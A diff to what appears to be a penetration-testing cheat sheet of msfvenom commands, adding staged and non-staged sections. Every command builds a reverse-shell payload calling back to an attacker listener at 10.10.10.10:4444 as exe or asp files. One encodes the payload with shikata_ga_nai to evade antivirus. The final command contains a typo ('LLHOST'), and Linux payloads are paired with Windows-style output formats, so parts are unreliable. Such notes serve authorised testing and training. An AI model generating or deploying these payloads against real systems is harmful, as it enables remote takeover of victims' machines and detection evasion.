@@ -1,9 +1,13 @@
-# List payloads
-msfvenom -l
+# List all payloads
+msfvenom -l payloads
 
 # Create a payload
+## staged
 msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse_shell.exe
 msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f asp -o reverse_shell.asp
+
+## non staged
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse_shell.exe
 
 # Create an encoded payload
 msfvenom -p linux/x86/shell/reverse_tcp LLHOST=10.10.10.101 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o reverse_shell_encoded.exe
